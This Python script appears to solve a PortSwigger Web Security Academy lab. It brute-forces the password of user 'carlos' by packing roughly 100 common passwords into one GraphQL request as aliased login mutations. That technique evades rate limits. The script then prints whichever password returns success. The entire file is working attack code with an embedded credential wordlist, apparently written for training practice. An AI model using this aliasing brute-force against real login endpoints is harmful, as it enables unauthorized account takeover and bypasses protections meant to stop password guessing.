import json
import http.client
import re

LAB_ID = "???"

def POST_graphql_v1(
        passwords: list[str],
) -> http.client.HTTPResponse:
    method, path = 'POST', '/graphql/v1'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'content-type': 'application/json',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
    "query": f"""
                mutation login {{
                    {
                        " ".join([
                            f'login{i}:login(input: {{username:"carlos",password:"{password}"}}) {{ token success }}'
                            for i, password in enumerate(passwords)
                        ])
                    }
                }}
        """,
    "operationName": "login",
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
             '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
             'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777',
             '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh',
             'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000',
             'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george',
             'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom',
             '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
             'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321',
             'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
             'moon', 'moscow']


response = POST_graphql_v1(passwords)
print(response.status)
body = response.read().decode('utf-8')
print(body)
found = re.findall('"login([0-9]+)":[a-zA-Z0-9 \n,"]+"success": true', body)
for key, obj in json.loads(body)['data'].items():
    if not obj['success']:
        continue
    pos = int(re.findall("login([0-9]+)", key)[0])
    print(f"found password: {passwords[pos]}")
    break
else:
    print("could not find password")
